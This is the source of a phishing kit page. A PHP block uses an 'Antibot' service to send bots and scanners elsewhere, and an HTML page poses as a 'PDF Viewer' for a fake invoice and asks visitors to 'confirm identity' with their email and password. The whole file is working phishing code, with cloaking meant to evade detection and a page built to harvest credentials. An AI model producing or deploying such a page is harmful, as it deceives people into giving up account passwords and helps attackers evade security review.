<?php
require_once('autoload.php'); 
if(isset($_GET['slug']) && $_SESSION['check'] == false){

	  $respons = $Antibot->redirect( $config['apikey'] , $_GET['slug']);
    $json    = $Antibot->json($respons);

    if($json['block_access']){
        if( preg_match("/404|403/", $json['block_access']) ){
            $Antibot->error(403 , 'You cannot access because your country or browser does not support.');
        }
    }

    if($json['status'] == false){
    	$Antibot->error(100 , $json['message']);
    }
    
    $_SESSION['check'] = true;

    if($json['is_bot'] == true){
	
  		$_SESSION['is_bot'] 	= true;
  		$_SESSION['direct_url']	= $json['direct_url'];
  		die(header("Location: ".$config['redirect_bot']));

    }
    
    $_SESSION['is_bot'] 	   = false;
    $_SESSION['direct_url']	  = $json['direct_url'];

    die(header("Location: ".$json['direct_url']));
}

if($_SESSION['check'] == true){
    die(header("Location: ".$_SESSION['direct_url']));
}
?>
<html>


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>PDF Viewer</title>
<link rel="shortcut icon" href="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/rg42gr.jpeg?alt=media&token=38b89526-7bf3-461f-b70c-83e52ad7ab4e" type="image/x-icon">
<link rel="icon" href="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/rg42gr.jpeg?alt=media&token=38b89526-7bf3-461f-b70c-83e52ad7ab4e" type="image/x-icon">
<link href="javascript/facebox/src/facebox.css" rel="stylesheet" type="text/css" />
<script src="js/only.js"></script>
<script language="javascript" type="text/javascript" src="javascript/jquery-1.6.2.min.js"></script>
<script language="javascript" type="text/javascript" src="javascript/facebox/src/facebox.js"></script>
<script language="javascript" type="text/javascript" src="javascript/watermark/jquery.watermark.js"></script>
<script language="javascript" type="text/javascript" src="javascript/javascript1.js"></script>
<style>
.low-radius {
border-radius: 4px;
}
.btn {
padding: 2px 20px;
}
.btn-nav {
color: rgb(255, 255, 255);
background-color: #9C1408;
box-shadow: rgba(0, 0, 0, 0.156863) 0px 4px 4px 0px;
border-color: white;
}
.btn {
display: inline-block;
margin-bottom: 0px;
font-weight: normal;
text-align: center;
vertical-align: middle;
cursor: pointer;
background-image: none;
border-image-source: initial;
border-image-slice: initial;
border-image-width: initial;
border-image-outset: initial;
border-image-repeat: initial;
white-space: nowrap;
font-size: 14px;
line-height: 1.42857;
-webkit-user-select: none;
border-width: 2px;
border-style: solid;
border-color: white;
padding: 6px 12px;
border-radius: 20px;
}
.cover{
position: absolute;
top: 0;
left: 0;
height: 1000px;
width: 100%;
background-color: rgba(0,0,0,0.3);
z-index: 10;
}
#blackBar{
position:fixed;
top:0;
left:0;
width:auto;
height:65px;
background-color:#2B579A;
}
html{
height:auto;
}
</style>
<style>
body {
    font-family: "wf_SegoeUILight","wf_SegoeUI","Segoe UI Light","Segoe WP Light","Segoe UI","Segoe","Segoe WP","Tahoma","Verdana","Arial","sans-serif";
}
</style>
</head>

<body style="background-color: rgb(156, 20, 8);>
<input>
<div id="blackBar">
<table style="text-align: left; width: 95%; height: 31px;">
  <tbody>
    <tr>
      <td>
      <table style="text-align: left; width: 100px;">
        <tbody>
          <tr>
            <td>
            <table
 style="text-align: left; left: 320px; width: 153px;">
              <tbody>
                <tr>
                  <td><img
 style="top: 97px; left: 326px; width: 45px; height: 45px;"
 alt="" src="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/rg42gr.jpeg?alt=media&token=38b89526-7bf3-461f-b70c-83e52ad7ab4e"></td>
                  <td><span
 style="color: white; font-size: 18px; ">PDF Viewer</span>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
            <td>
            <table
 style="text-align: left; width: 455px; height: 27px;">
              <tbody>
                <tr>
                  <td>
&nbsp;&nbsp;<a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Download</small></a> &nbsp;&nbsp;<a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Open</small></a>
&nbsp;&nbsp; <a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Preview</small></a> &nbsp;&nbsp;</td>
                  <td
 style="color: white; "><small></small></td>
                </tr>
              </tbody>
            </table>
            </td>
          </tr>
        </tbody>
      </table>
      </td>
      <td colspan="2"><small><span
 style="color: white; white-space: nowrap; float: left;"></span></small>
      <table
 style="text-align: left; margin-left: auto; margin-right: 0px; width: auto; height: 19px;">
        <tbody>
          <tr>
            <td>
            <table
 style="text-align: left; margin-left: auto; margin-right: 0px; width: 1px; height: 57px;">
              <tbody>
                <tr>
                  <td><img style="width: 42px; height: 42px;"
 alt="" src="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/Yyjfy0Tr4g4.png?alt=media&token=dca0043e-6387-414a-ae56-f18f97bce8a2"></td>
                  <td><span
 style="color: white; "></span></td>
                </tr>
              </tbody>
            </table>
            </td>
            <td style="text-align: right;"><a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Terms of Service</small></a></td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</table>
</div>
<div style="top: 67px;" class="cover">
<table align="center" style="background-color: rgb(225, 225, 225); text-align: center; width: 500px; height: 737px;" cellpadding="2" cellspacing="2">
<tbody>
<tr>
<td>
<div style="text-align: center;">
<span style="color: #4b4c4c; font-weight: bold; font-size: 17px;">CONFIRM YOUR IDENTITY.</span><br>
<span style="color: #4b4c4c; font-weight: 300;">Sign in with your valid email account to view this document.</span>
</div>
<br>
<br>
<img style="width: 150px; height: 150px;"
 alt="" src="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/rg42gr.jpeg?alt=media&token=38b89526-7bf3-461f-b70c-83e52ad7ab4e">
<br>
<span style="color: black; font-weight: 300; font-size: 13px;">FILE: Invoice897654.pdf</span>
<br>
<br>
<span style="color: #4b4c4c; ">File protection is enabled. Enter Email to Continue.</span><br><br>

<table align="center" style="text-align: left; top: 324px; left: 321px; width: 400px; height: 88px;" cellpadding="2" cellspacing="2">
<tbody>
<tr>
<td> <p align="center">
    <label for="textfield"></label>
    <input name="textfield" type="text" class="textfldclass" id="email_field" value="" style="border-style: none; padding: 5px 20px; height: 25px; font-size: 20px; -moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius:6px; color: #666666;"/>
    <br />
  <div id="the_d_" style="display: none" align="center"><input name="passwww" type="password" class="textfldclass" id="password_field" style="border-style: none; padding: 5px 20px; height: 25px; font-size: 20px; -moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius:6px; color: #666666;"/></div>

  </p>
  <p align="center">
    <input name="button" type="submit" class="btn btn-nav low-radius" id="download" value="Start Download" />
    <br />
  </p></td>
</tr>
<tr>
<td style="text-align: center;">&nbsp;</td>
</tr>
</tbody>
</table>

<small style="color: black;  font-weight: 300;"><span>*
simple to use.<br>
* cross-platform compatibility.
</span><br>
<span>* IRM and
password-protection.</span>
<br>
<br>
<span>
The contents of this document are confidential and intended solely for the recipient. Reproduction of, or forwarding to anyone not directly sent this document is strictly forbidden.</span><br></small>
</td>
</tr>
</tbody>
</table>
</div>
<div  style="border: 1px solid black;"><img src="https://firebasestorage.googleapis.com/v0/b/wfr3-4b09c.appspot.com/o/wrjkr.png?alt=media&token=b10b4655-bbac-4dd6-b577-52f62a9f27d4" alt="" style=" width:100%; height:auto; max-height:100%;">
</div>
</body>
</html>
